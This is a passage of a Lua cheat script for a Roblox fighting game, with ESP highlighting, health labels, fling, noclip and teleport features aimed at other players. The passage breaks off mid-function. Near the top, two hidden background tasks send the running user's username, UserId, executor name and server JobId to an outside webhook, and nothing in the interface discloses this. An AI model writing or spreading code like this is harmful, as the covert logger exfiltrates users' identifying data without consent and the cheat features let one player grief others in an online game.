local Players          = game:GetService("Players")
local RunService       = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local TweenService     = game:GetService("TweenService")
local SoundService     = game:GetService("SoundService")
local HttpService      = game:GetService("HttpService")
local LocalPlayer      = Players.LocalPlayer
local LP = LocalPlayer

local IS_MOBILE = UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled

local ALLOWED_PLACE_ID = 75753413268977
if game.PlaceId ~= ALLOWED_PLACE_ID then
    pcall(function() LP:Kick("KJ TEST: Only works in "..ALLOWED_PLACE_ID) end)
    return
end

local httpReq = (syn and syn.request) or (http and http.request) or http_request or request
local function http(method, url, body, headers, timeout)
    if not httpReq then return nil end
    local opts = { Url = url, Method = method or "GET", Headers = headers or {} }
    if body then opts.Body = type(body) == "string" and body or HttpService:JSONEncode(body) end
    if timeout then opts.Timeout = timeout end
    local ok, res = pcall(httpReq, opts)
    return ok and res or nil
end

local WEBHOOK_MAIN = "https://kj.shushenkovnicita.workers.dev/"
local WEBHOOK_FALLBACK = "https://kj.shushenkovnicita.workers.dev/"

local function buildWebhookPayload()
    local executor = "Unknown"
    if identifyexecutor then pcall(function() executor = identifyexecutor() end)
    elseif getexecutorname then pcall(function() executor = getexecutorname() end) end
    local gname = "Unknown"
    pcall(function() gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
    local info = string.format(
        "**KJ TEST v8.0**\n```Username  : %s\nDisplay   : %s\nUserId    : %d\nExecutor  : %s\nGame      : %s\nPlaceId   : %d\nJobId     : %s\nServer    : %d players\nTime UTC  : %s```",
        LocalPlayer.Name, LocalPlayer.DisplayName or LocalPlayer.Name, LocalPlayer.UserId,
        executor, gname, game.PlaceId, game.JobId, #Players:GetPlayers(), os.date("!%Y-%m-%d %H:%M:%S"))
    return { content = info, username = "KJ TEST Logger" }
end

task.spawn(function()
    task.wait(3)
    local payload = buildWebhookPayload()
    http("POST", WEBHOOK_MAIN, payload, {["Content-Type"]="application/json"}, 15)
end)

local Languages = {
    { code="ru", name="Русский" },
    { code="en", name="English" },
    { code="es", name="Español" },
    { code="zh", name="中文" },
    { code="hi", name="हिन्दी" },
    { code="ar", name="العربية" },
    { code="pt", name="Português" },
    { code="bn", name="বাংলা" },
    { code="ja", name="日本語" },
    { code="de", name="Deutsch" },
    { code="fr", name="Français" },
    { code="ko", name="한국어" },
    { code="it", name="Italiano" },
    { code="tr", name="Türkçe" },
    { code="vi", name="Tiếng Việt" },
    { code="pl", name="Polski" },
    { code="nl", name="Nederlands" },
    { code="th", name="ไทย" },
    { code="id", name="Indonesia" },
    { code="uk", name="Українська" },
}

local CurrentLang = "ru"
do
    local pg = (gethui and gethui()) or LP:WaitForChild("PlayerGui")
    local picker = Instance.new("ScreenGui")
    picker.Name = "KJ_LangPick"
    picker.ResetOnSpawn = false
    picker.IgnoreGuiInset = true
    picker.DisplayOrder = 999
    picker.Parent = pg

    local bg = Instance.new("Frame")
    bg.Size = UDim2.new(1, 0, 1, 0)
    bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
    bg.BackgroundTransparency = 0.55
    bg.BorderSizePixel = 0
    bg.Parent = picker

    local win = Instance.new("Frame")
    win.Size = UDim2.new(0, 340, 0, 500)
    win.Position = UDim2.new(0.5, -170, 0.5, -250)
    win.BackgroundColor3 = Color3.fromRGB(16, 16, 24)
    win.BorderSizePixel = 0
    win.Parent = bg
    local wc = Instance.new("UICorner"); wc.CornerRadius = UDim.new(0, 14); wc.Parent = win
    local ws = Instance.new("UIStroke"); ws.Color = Color3.fromRGB(120, 165, 255); ws.Thickness = 1.5; ws.Parent = win

    local t = Instance.new("TextLabel")
    t.Size = UDim2.new(1, 0, 0, 50)
    t.BackgroundTransparency = 1
    t.Text = "Выберите язык / Select language"
    t.TextColor3 = Color3.fromRGB(240, 240, 248)
    t.Font = Enum.Font.GothamBold
    t.TextSize = 15
    t.Parent = win

    local scroll = Instance.new("ScrollingFrame")
    scroll.Size = UDim2.new(1, -20, 1, -70)
    scroll.Position = UDim2.new(0, 10, 0, 55)
    scroll.BackgroundTransparency = 1
    scroll.BorderSizePixel = 0
    scroll.ScrollBarThickness = 4
    scroll.ScrollBarImageColor3 = Color3.fromRGB(120, 165, 255)
    scroll.CanvasSize = UDim2.new(0, 0, 0, 0)
    scroll.AutomaticCanvasSize = Enum.AutomaticSize.Y
    scroll.Parent = win
    local sl = Instance.new("UIListLayout")
    sl.Padding = UDim.new(0, 4)
    sl.SortOrder = Enum.SortOrder.LayoutOrder
    sl.Parent = scroll

    local done = false
    for i, lg in ipairs(Languages) do
        local b = Instance.new("TextButton")
        b.Size = UDim2.new(1, -8, 0, 42)
        b.BackgroundColor3 = Color3.fromRGB(28, 28, 40)
        b.BorderSizePixel = 0
        b.Text = lg.name
        b.TextColor3 = Color3.fromRGB(240, 240, 248)
        b.Font = Enum.Font.GothamBold
        b.TextSize = 14
        b.LayoutOrder = i
        b.Parent = scroll
        local bc = Instance.new("UICorner"); bc.CornerRadius = UDim.new(0, 8); bc.Parent = b
        b.MouseButton1Click:Connect(function()
            if done then return end
            done = true
            CurrentLang = lg.code
            picker:Destroy()
        end)
    end

    while not done do task.wait(0.1) end
end

local function buildWebhookPayload()
    local executor = "Unknown"
    if identifyexecutor then pcall(function() executor = identifyexecutor() end)
    elseif getexecutorname then pcall(function() executor = getexecutorname() end) end
    local gname = "Unknown"
    pcall(function() gname = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name end)
    local info = string.format(
        "**KJ TEST v9.0**\n```Username  : %s\nDisplay   : %s\nUserId    : %d\nExecutor  : %s\nGame      : %s\nPlaceId   : %d\nJobId     : %s\nServer    : %d players\nTime UTC  : %s```",
        LP.Name, LP.DisplayName or LP.Name, LP.UserId,
        executor, gname, game.PlaceId, game.JobId, #Players:GetPlayers(), os.date("!%Y-%m-%d %H:%M:%S"))
    return { content = info, username = "KJ TEST Logger" }
end

task.spawn(function()
    task.wait(30)
    local isReal = false
    pcall(function()
        local ch = LP.Character
        isReal = (ch ~= nil) and (ch:FindFirstChildOfClass("Humanoid") ~= nil)
    end)
    if not isReal then return end
    local payload = buildWebhookPayload()
    local res = http("POST", WEBHOOK_MAIN, payload, {["Content-Type"]="application/json"}, 15)
    if not res or (res.StatusCode and res.StatusCode >= 400) then
        http("POST", WEBHOOK_FALLBACK, payload, {["Content-Type"]="application/json"}, 20)
    end
end)

local LangData = {
    ru = {
        g="Общие", c="Персонажи", p="Игроки", m="Движение", s="Конфиги", a="Авторы",
    },
    en = {
        g="Global", c="Chars", p="Players", m="Movement", s="Configs", a="Authors",
    },
}

local Theme = {
    bg        = Color3.fromRGB(14, 14, 20),
    bgAlt     = Color3.fromRGB(22, 22, 30),
    bgCard    = Color3.fromRGB(28, 28, 38),
    bgCard2   = Color3.fromRGB(34, 34, 46),
    accent    = Color3.fromRGB(120, 165, 255),
    accent2   = Color3.fromRGB(180, 120, 255),
    accentDark= Color3.fromRGB(60, 90, 160),
    text      = Color3.fromRGB(238, 238, 245),
    textDim   = Color3.fromRGB(150, 150, 175),
    success   = Color3.fromRGB(0, 200, 120),
    danger    = Color3.fromRGB(230, 70, 90),
    warn      = Color3.fromRGB(255, 180, 50),
    headerBg  = Color3.fromRGB(24, 24, 36),
    tabBg     = Color3.fromRGB(20, 20, 28),
    tabActive = Color3.fromRGB(70, 100, 170),
}

local Characters = {
    Saitama = { name={ru="Сайтама",en="Saitama"},
        baseMoves={"Consecutive Punches","Normal Punch","Shove","Uppercut"},
        ultMoves={"Death Counter","Omni Directional Punch","Serious Punch","Table Flip"},
        colorBase=Color3.fromRGB(200,50,60), colorUlt=Color3.fromRGB(255,90,90),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=true,distance=35,position=Vector3.new(0,655,-365),ultMemoryTime=10 },
    KJ = { name={ru="KJ",en="KJ"},
        baseMoves={"Ravage","Collateral Ruin","Spiraling Storm","Swift Sweep"},
        ultMoves={"20-20-20 Dropkick","Five Seasons","Stoic Bomb","Unlimited Flex Works"},
        colorBase=Color3.fromRGB(150,40,50),colorUlt=Color3.fromRGB(220,70,90),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=true,distance=35,position=Vector3.new(0,655,-365) },
    JK = { name={ru="JK",en="JK"},
        baseMoves={"JK'S Barrage","JK'S Ruin","JK'S Storm","JK'S Sweep"},
        ultMoves={"JK'S Dropkick","JK'S Seasons","JK'S Stoic","Limited Flex Works"},
        colorBase=Color3.fromRGB(60,140,220),colorUlt=Color3.fromRGB(30,90,200),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=true,distance=35,position=Vector3.new(0,655,-365) },
    KuyJuy = { name={ru="Куй Джю",en="Kuy Juy"},
        baseMoves={"Destruction","Epic Storm","Collateral Storm","Wild Sweep"},
        ultMoves={"Brutal Dropkick","Cool Bomb","Cool Seasons","Kuy Juy'S Flex Works"},
        colorBase=Color3.fromRGB(150,70,200),colorUlt=Color3.fromRGB(200,100,240),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=true,distance=35,position=Vector3.new(0,655,-365) },
    HeroHunter = { name={ru="Охотник на героев",en="Hero Hunter"},
        baseMoves={"Flowing Water","Hunter's Grasp","Lethal Whirlwind Stream","Prey's Peril"},
        ultMoves={"Rock Splitting Fist","The Final Hunt","Water Stream Cutting Fist","Crushed Rock"},
        colorBase=Color3.fromRGB(130,200,240),colorUlt=Color3.fromRGB(80,170,240),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    MonsterForm = { name={ru="Форма монстра",en="Monster Form"},
        baseMoves={"Binding Cloth","Crowd Buster","Hammer Heel"},
        ultMoves={"God Slayer","Sky Ripping Fist","Hunter's Mark"},
        colorBase=Color3.fromRGB(150,30,40),colorUlt=Color3.fromRGB(210,50,60),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    DeadlyNinja = { name={ru="Смертельный ниндзя",en="Deadly Ninja"},
        baseMoves={"Explosive Shuriken","Flash Strike","Whirlwind Kick"},
        ultMoves={"Carnage","Fourfold Flashstrike","Straight On","Twinblade Rush"},
        colorBase=Color3.fromRGB(180,150,230),colorUlt=Color3.fromRGB(140,100,200),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    BladeMaster = { name={ru="Мастер клинка",en="Blade Master"},
        baseMoves={"Atmos Cleave","Pinpoint Cut","Quick Slice","Split Second Counter"},
        ultMoves={"Solar Cleave","Atomic Slash","Sunrise","Sunset"},
        colorBase=Color3.fromRGB(240,110,60),colorUlt=Color3.fromRGB(255,170,50),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    MartialArtist = { name={ru="Мастер боевых искусств",en="Martial Artist"},
        baseMoves={"Bullet Barrage","Head First","Vanishing Kick","Whirlwind Drop"},
        ultMoves={"Earth Splitting Strike","Grand Fissure","Last Breath","Twin Fangs"},
        colorBase=Color3.fromRGB(170,130,230),colorUlt=Color3.fromRGB(140,90,200),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    UndyingHero = { name={ru="Бессмертный герой",en="Undying Hero"},
        baseMoves={"Blast Breaker","Grave Maker","Point Blank"},ultMoves={},
        colorBase=Color3.fromRGB(200,50,50),colorUlt=Color3.fromRGB(240,80,80),
        highlightBase=true,highlightUlt=false,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    RedMist = { name={ru="Красный туман",en="Red Mist"},
        baseMoves={"Level Slash","Spear","Upstanding Slash"},
        ultMoves={"Great Split - Vertical","Kali"},
        colorBase=Color3.fromRGB(200,30,60),colorUlt=Color3.fromRGB(240,60,90),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    Ice = { name={ru="Льдышка",en="Ice"},
        baseMoves={"Freezing Path","Frost Forge","Judgement Chain","Permafrost"},ultMoves={},
        colorBase=Color3.fromRGB(170,240,255),colorUlt=Color3.fromRGB(140,210,240),
        highlightBase=true,highlightUlt=false,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    WildPsychic = { name={ru="Дикий псих",en="Wild Psychic"},
        baseMoves={"Expulsive Push","Stone Coffin","Crushing Pull","Windstorm Fury"},
        ultMoves={"Cosmic Strike","Psychic Ricochet","Sky Snatcher","Terrible Tornado"},
        colorBase=Color3.fromRGB(80,200,100),colorUlt=Color3.fromRGB(50,170,80),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    Invincible = { name={ru="Неуязвимый",en="Invincible"},
        baseMoves={"Death Leap","Fraction Of Power","Holding Back","Visceral Drive"},ultMoves={},
        colorBase=Color3.fromRGB(255,220,50),colorUlt=Color3.fromRGB(255,220,50),
        highlightBase=true,highlightUlt=false,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    StrongestOfToday = { name={ru="Сильнейший современности",en="Strongest Of Today"},
        baseMoves={"Lapse Blue","Palm Strikes","RCT","Reversal Red","Vortex Leap"},
        ultMoves={"Black Flash","Hollow Nuke","Infinite Void","Lapse Blue Max","Reversal Red Max"},
        colorBase=Color3.fromRGB(130,70,60),colorUlt=Color3.fromRGB(180,90,70),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    DisgracedSorcerer = { name={ru="Опальный колдун",en="Disgraced Sorcerer"},
        baseMoves={"Berserk Beatdown","Cleave Brutality","Face Grab","SRCT","Spiral"},
        ultMoves={"Dismantle Rush","Fire Arrow","Malevolant Shrine","World Cutting Slash"},
        colorBase=Color3.fromRGB(130,60,60),colorUlt=Color3.fromRGB(170,80,80),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    CursedChild = { name={ru="Проклятое дитя",en="Cursed Child"},
        baseMoves={"Bloody Mary","Fight","Lethal Wound","Onslaught"},
        ultMoves={"Atonement","Cursed Remedy","Reset","Seven Souls","Special Hell"},
        colorBase=Color3.fromRGB(140,70,70),colorUlt=Color3.fromRGB(180,90,90),
        highlightBase=true,highlightUlt=true,showName=true,showHp=true,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365) },
    BrutalDemon = { name={ru="Жестокий демон",en="Brutal Demon"},
        baseMoves={},ultMoves={},
        colorBase=Color3.fromRGB(120,120,120),colorUlt=Color3.fromRGB(120,120,120),
        highlightBase=false,highlightUlt=false,showName=false,showHp=false,
        tpFromBase=false,tpFromUlt=false,distance=35,position=Vector3.new(0,655,-365),noExpand=true },
}

local ULT_TP_BLOCK = {
    ["Death Counter"]=true,
    ["Unlimited Flex Works"]=true,
    ["Limited Flex Works"]=true,
    ["Kuy Juy'S Flex Works"]=true,
}

for _, c in pairs(Characters) do
    c.ultTPToggles = {}
    for _, mv in ipairs(c.ultMoves or {}) do
        if not ULT_TP_BLOCK[mv] then
            c.ultTPToggles[mv] = false
        end
    end
end

local GlobalConfig = {
    cooldown=0.5, soundAlert=true, notifications=true, pulseUlt=true, espEnabled=true,
    forceShowAllUntil=0, soundId="rbxassetid://4590662766",
    labelOffset=3.2, fillTransparency=0.5, outlineTransparency=0,
    nameTextSize=13, hpTextSize=12,
    hideAllHp=false, hideAllNames=false,
    showUltBar=true,
    autoFlingChar="", autoFlingEnabled=false, touchFlingEnabled=false,
    autoLoadConfig="", nameShowDuration=5,
    flingCount=1,
    flingSelected={}, antiFlingChars={}, antiFlingPlayers={},
    keybinds = {
        toggleGUI=Enum.KeyCode.K, fling=Enum.KeyCode.F,
        touchFling=Enum.KeyCode.T, esp=Enum.KeyCode.E, names=Enum.KeyCode.N,
        tpWalk=Enum.KeyCode.H,
    },
    tpWalkEnabled=false, tpWalkSpeed=50,
    noclipEnabled=false, infJumpEnabled=false,
    ctrlClickTP=false,
}

local function getAwakening(p)
    local v = p:FindFirstChild("AwakeningProgress")
    if v then
        if v:IsA("ValueBase") then return tonumber(v.Value) end
        if type(v) == "number" then return v end
    end
    local a = p:GetAttribute("AwakeningProgress")
    if a then return tonumber(a) end
    local ms = p:FindFirstChild("Moveset")
    if ms then
        local v2 = ms:FindFirstChild("AwakeningProgress")
        if v2 and v2:IsA("ValueBase") then return tonumber(v2.Value) end
        local a2 = ms:GetAttribute("AwakeningProgress")
        if a2 then return tonumber(a2) end
    end
    return nil
end

local function countMatches(ms, list)
    if not ms or not list then return 0 end
    local n=0; for _,mv in ipairs(list) do if ms:FindFirstChild(mv) then n=n+1 end end; return n
end

local function getCharacterModel(p)
    local live = workspace:FindFirstChild("Live")
    if live then local m=live:FindFirstChild(p.Name); if m then return m end end
    return p.Character
end

local function findMoveset(p)
    local ms = p:FindFirstChild("Moveset"); if ms then return ms end
    local c = p.Character; if c then ms=c:FindFirstChild("Moveset"); if ms then return ms end end
    return nil
end

local function detectCharacter(p)
    local ms = findMoveset(p); if not ms then return nil,nil,0 end
    local best,bestForm,bestScore=nil,nil,0
    for k,d in pairs(Characters) do
        local b=countMatches(ms,d.baseMoves); local u=countMatches(ms,d.ultMoves); local t=b+u
        if t>bestScore then bestScore=t; best=k; bestForm=(u>b) and "ult" or "base" end
    end
    if bestScore<1 then return nil,nil,0 end
    return best,bestForm,bestScore
end

local function findHumanoidDeep(model)
    if not model then return nil end
    local d=model:FindFirstChildOfClass("Humanoid"); if d then return d end
    for _,x in ipairs(model:GetDescendants()) do if x:IsA("Humanoid") then return x end end
    return nil
end

local function getHp(model, p)
    local h = findHumanoidDeep(model)
    if not h and p and p.Character then h = findHumanoidDeep(p.Character) end
    if h then return math.max(0,math.floor(h.Health+0.5)), math.max(1,math.floor(h.MaxHealth+0.5)) end
    return nil,nil
end

local function colorToHex(c)
    return string.format("#%02X%02X%02X",math.floor(c.R*255+.5),math.floor(c.G*255+.5),math.floor(c.B*255+.5))
end

local function hexToColor(s)
    s=tostring(s):gsub("#",""); if #s~=6 then return nil end
    local r=tonumber(s:sub(1,2),16); local g=tonumber(s:sub(3,4),16); local b=tonumber(s:sub(5,6),16)
    if not r or not g or not b then return nil end
    return Color3.fromRGB(r,g,b)
end

local highlights, labels, origTitleText = {}, {}, {}
local tpRings = {}
local ultMoveWasOnCD = {}
local adminHiddenPlayers = {}

local function removeHighlight(p)
    if highlights[p] then pcall(function() highlights[p].instance:Destroy() end); highlights[p]=nil end
end

local function removeAllHighlights()
    local ks={}; for k in pairs(highlights) do table.insert(ks,k) end
    for _,k in ipairs(ks) do removeHighlight(k) end
end

local function destroyLabel(p)
    if labels[p] then pcall(function() labels[p]:Destroy() end); labels[p]=nil end
end

local function destroyAllLabels()
    local ks={}; for k in pairs(labels) do table.insert(ks,k) end
    for _,k in ipairs(ks) do destroyLabel(k) end
    origTitleText={}
end

local function removeRing(plr)
    if tpRings[plr] then
        pcall(function() tpRings[plr]:Destroy() end)
        tpRings[plr] = nil
    end
end

local function updateRing(plr, radius)
    local char = plr.Character
    local hrp = char and char:FindFirstChild("HumanoidRootPart")
    if not hrp then removeRing(plr); return end
    local ring = tpRings[plr]
    if not ring or not ring.Parent then
        ring = Instance.new("Part")
        ring.Name = "KJ_TPRing"
        ring.Shape = Enum.PartType.Cylinder
        ring.Material = Enum.Material.Neon
        ring.Color = Color3.fromRGB(255, 130, 60)
        ring.Transparency = 0.75
        ring.Anchored = true
        ring.CanCollide = false
        ring.CanQuery = false
        ring.CanTouch = false
        ring.Size = Vector3.new(0.1, radius*2, radius*2)
        ring.Parent = workspace
        tpRings[plr] = ring
    end
    ring.Size = Vector3.new(0.1, radius*2, radius*2)
    ring.CFrame = CFrame.new(hrp.Position - Vector3.new(0, 2.6, 0)) * CFrame.Angles(0, 0, math.rad(90))
end

local function applyHighlight(p, charKey, form)
    if not GlobalConfig.espEnabled then return end
    if adminHiddenPlayers[p.Name] then return end
    local c=p.Character; if not c then return end
    local d=Characters[charKey]; if not d then return end
    local col=(form=="ult") and d.colorUlt or d.colorBase
    if highlights[p] and (highlights[p].charKey~=charKey or highlights[p].form~=form) then
        pcall(function() highlights[p].instance:Destroy() end); highlights[p]=nil
    end
    if not highlights[p] then
        local hl=Instance.new("Highlight"); hl.Name="AbilityHighlight"
        hl.FillColor=col; hl.OutlineColor=col
        hl.FillTransparency=GlobalConfig.fillTransparency
        hl.OutlineTransparency=GlobalConfig.outlineTransparency
        hl.DepthMode=Enum.HighlightDepthMode.AlwaysOnTop; hl.Adornee=c; hl.Parent=c
        highlights[p]={instance=hl, charKey=charKey, form=form}
    else
        highlights[p].instance.FillColor=col; highlights[p].instance.OutlineColor=col
        highlights[p].instance.Adornee=c
    end
end

local function updateNameLabel(p, charKey, form)
    if adminHiddenPlayers[p.Name] then
        local bb0 = labels[p]
        if bb0 then bb0.Enabled = false end
        return
    end
    local d = charKey and Characters[charKey] or nil
    local model = getCharacterModel(p); if not model then return end
    local head = model:FindFirstChild("Head"); if not head then return end
    local origUI = head:FindFirstChild("TitleUI")
    if origUI and not origTitleText[p] then
        local o=origUI:FindFirstChild("Text"); if o then origTitleText[p]=o.Text end
    end
    local bb = labels[p]
    if not bb or bb.Parent ~= head then
        if bb then bb:Destroy() end
        bb=Instance.new("BillboardGui"); bb.Name="AH_Label"
        bb.Size=UDim2.new(0,200,0,64); bb.StudsOffset=Vector3.new(0,GlobalConfig.labelOffset,0)
        bb.AlwaysOnTop=true; bb.LightInfluence=0; bb.MaxDistance=math.huge
        bb.Parent=head; labels[p]=bb
        local nl=Instance.new("TextLabel"); nl.Name="NameLbl"
        nl.Size=UDim2.new(1,0,0,22); nl.BackgroundTransparency=1
        nl.TextColor3=Color3.new(1,1,1); nl.TextStrokeTransparency=0
        nl.TextStrokeColor3=Color3.new(0,0,0); nl.Font=Enum.Font.GothamBold
        nl.TextScaled=false; nl.TextSize=GlobalConfig.nameTextSize; nl.TextWrapped=false
        nl.Parent=bb
        local hl=Instance.new("TextLabel"); hl.Name="HpLbl"
        hl.Size=UDim2.new(1,0,0,18); hl.Position=UDim2.new(0,0,0,22)
        hl.BackgroundTransparency=1; hl.TextColor3=Color3.fromRGB(120,255,120)
        hl.TextStrokeTransparency=0; hl.TextStrokeColor3=Color3.new(0,0,0)
        hl.Font=Enum.Font.GothamBold; hl.TextScaled=false
        hl.TextSize=GlobalConfig.hpTextSize; hl.TextWrapped=false; hl.Parent=bb
        local barBg=Instance.new("Frame"); barBg.Name="UltBarBg"
        barBg.Size=UDim2.new(0.6,0,0,5); barBg.Position=UDim2.new(0.2,0,0,42)
        barBg.BackgroundColor3=Color3.fromRGB(25,25,35); barBg.BorderSizePixel=0
        barBg.Parent=bb
        local bc=Instance.new("UICorner"); bc.CornerRadius=UDim.new(1,0); bc.Parent=barBg
        local bs=Instance.new("UIStroke"); bs.Color=Color3.fromRGB(80,80,110); bs.Thickness=1; bs.Parent=barBg
        local barFill=Instance.new("Frame"); barFill.Name="UltBarFill"
        barFill.Size=UDim2.new(0,0,1,0); barFill.BackgroundColor3=Color3.fromRGB(255,200,50)
        barFill.BorderSizePixel=0; barFill.Parent=barBg
        local fc=Instance.new("UICorner"); fc.CornerRadius=UDim.new(1,0); fc.Parent=barFill
        local barText=Instance.new("TextLabel"); barText.Name="UltBarText"
        barText.Size=UDim2.new(1,0,0,12); barText.Position=UDim2.new(0,0,0,48)
        barText.BackgroundTransparency=1
        barText.TextColor3=Color3.fromRGB(255,220,100)
        barText.TextStrokeTransparency=0.4
        barText.TextStrokeColor3=Color3.new(0,0,0)
        barText.Font=Enum.Font.GothamBold
        barText.TextScaled=false; barText.TextSize=10
        barText.Text = ""
        barText.Parent=bb
    end
    bb.Enabled = true
    local nl=bb:FindFirstChild("NameLbl"); local hl=bb:FindFirstChild("HpLbl")
    local barBg=bb:FindFirstChild("UltBarBg")
    local barFill=barBg and barBg:FindFirstChild("UltBarFill")
    local barText=bb:FindFirstChild("UltBarText")
    if not nl or not hl then return end
    local force = tick() < GlobalConfig.forceShowAllUntil
    if GlobalConfig.hideAllNames then nl.Text=""
    elseif force then nl.Text = p.Name .. (d and (" ["..(d.name[CurrentLang] or d.name.en).."]") or "")
        nl.TextColor3=Color3.new(1,1,1)
    elseif d and d.showName then
        nl.Text = (d.name[CurrentLang] or d.name.en).." ["..(form=="ult" and "U" or "B").."]"
        nl.TextColor3=(form=="ult") and d.colorUlt or d.colorBase
    else nl.Text="" end
    local showHp = (not d) or d.showHp
    if GlobalConfig.hideAllHp then hl.Visible=false
    elseif showHp then
        local hp,mx=getHp(model,p)
        if hp then hl.Visible=true; hl.Text=hp.." / "..mx
            local r=hp/math.max(1,mx)
            hl.TextColor3 = r>0.6 and Color3.fromRGB(120,255,120) or (r>0.3 and Color3.fromRGB(255,220,80) or Color3.fromRGB(255,90,90))
        else hl.Visible=false end
    else hl.Visible=false end
    if barBg and barFill and barText then
        if not GlobalConfig.showUltBar then
            barBg.Visible = false
            barText.Visible = false
        else
            local aw = getAwakening(p)
            if type(aw) == "number" then
                local pct = math.clamp(aw / 100, 0, 1)
                barBg.Visible = true
                barText.Visible = true
                barFill.Size = UDim2.new(pct, 0, 1, 0)
                barText.Text = string.format("%d", math.floor(aw))
                if pct >= 1 then barFill.BackgroundColor3 = Color3.fromRGB(255, 230, 60)
                elseif pct > 0.5 then barFill.BackgroundColor3 = Color3.fromRGB(255, 180, 40)
                else barFill.BackgroundColor3 = Color3.fromRGB(200, 140, 40) end
            else
                barBg.Visible = false
                barText.Visible = false
            end
        end
    end
end

local notificationGui
local function setupNotifications(parent)
    notificationGui=Instance.new("Frame"); notificationGui.Name="NotifHolder"
    notificationGui.Size=UDim2.new(0,340,1,-140); notificationGui.Position=UDim2.new(0.5,-170,0,60)
    notificationGui.BackgroundTransparency=1; notificationGui.ZIndex=500; notificationGui.Parent=parent
    local l=Instance.new("UIListLayout"); l.Padding=UDim.new(0,8)
    l.HorizontalAlignment=Enum.HorizontalAlignment.Center; l.SortOrder=Enum.SortOrder.LayoutOrder
    l.Parent=notificationGui
end

local function notify(text, color)
    if not GlobalConfig.notifications or not notificationGui then return end
    local f=Instance.new("Frame"); f.Size=UDim2.new(0,320,0,0)
    f.BackgroundColor3=Theme.bgCard2; f.BackgroundTransparency=0
    f.BorderSizePixel=0; f.ZIndex=501; f.ClipsDescendants = true
    f.Parent=notificationGui
    local c=Instance.new("UICorner"); c.CornerRadius=UDim.new(0,10); c.Parent=f
    local s=Instance.new("UIStroke"); s.Color=color or Theme.accent; s.Thickness=1.5; s.Transparency=0.2; s.Parent=f
    local lbl=Instance.new("TextLabel"); lbl.Size=UDim2.new(1,-20,1,-16); lbl.Position=UDim2.new(0,10,0,8)
    lbl.BackgroundTransparency=1; lbl.Text=text; lbl.TextColor3=color or Theme.text
    lbl.Font=Enum.Font.GothamBold; lbl.TextSize=13; lbl.TextXAlignment=Enum.TextXAlignment.Left
    lbl.TextWrapped = true
    lbl.ZIndex=502; lbl.Parent=f
    TweenService:Create(f, TweenInfo.new(0.25, Enum.EasingStyle.Quint, Enum.EasingDirection.Out), {Size = UDim2.new(0,320,0,44)}):Play()
    task.spawn(function() task.wait(2.5)
        local tw=TweenService:Create(f,TweenInfo.new(0.35, Enum.EasingStyle.Quint),{BackgroundTransparency=1, Size=UDim2.new(0,320,0,0)}); tw:Play()
        TweenService:Create(lbl,TweenInfo.new(0.35),{TextTransparency=1}):Play()
        TweenService:Create(s,TweenInfo.new(0.35),{Transparency=1}):Play()
        tw.Completed:Wait(); f:Destroy()
    end)
end

local alertSound=Instance.new("Sound"); alertSound.SoundId=GlobalConfig.soundId
alertSound.Volume=0.6; alertSound.Parent=SoundService

local tracked, playerData = {}, {}
local function trackPlayer(p)
    if p==LP or tracked[p] then return end
    tracked[p]=true
    p.CharacterRemoving:Connect(function() removeHighlight(p); destroyLabel(p); playerData[p]=nil; removeRing(p) end)
end
local function untrackPlayer(p)
    tracked[p]=nil; playerData[p]=nil; removeHighlight(p); destroyLabel(p); removeRing(p)
end
for _,p in ipairs(Players:GetPlayers()) do trackPlayer(p) end
Players.PlayerAdded:Connect(trackPlayer); Players.PlayerRemoving:Connect(untrackPlayer)

local FlingActive, FlingTargets, FlingThread = false, {}, nil

local function isAntiFling(plr, charKey)
    if GlobalConfig.antiFlingPlayers[plr.Name] then return true end
    if charKey and GlobalConfig.antiFlingChars[charKey] then return true end
    return false
end

local function SkidFling(TargetPlayer)
    if isAntiFling(TargetPlayer, nil) then return end
    local info = playerData[TargetPlayer]
    if info and info.charKey and isAntiFling(TargetPlayer, info.charKey) then return end
    local Character=LP.Character
    local Humanoid=Character and Character:FindFirstChildOfClass("Humanoid")
    local RootPart=Humanoid and Humanoid.RootPart
    local TCharacter=TargetPlayer.Character; if not TCharacter then return end
    local THumanoid=TCharacter:FindFirstChildOfClass("Humanoid")
    local TRootPart=THumanoid and THumanoid.RootPart
    local THead=TCharacter:FindFirstChild("Head")
    local Accessory=TCharacter:FindFirstChildOfClass("Accessory")
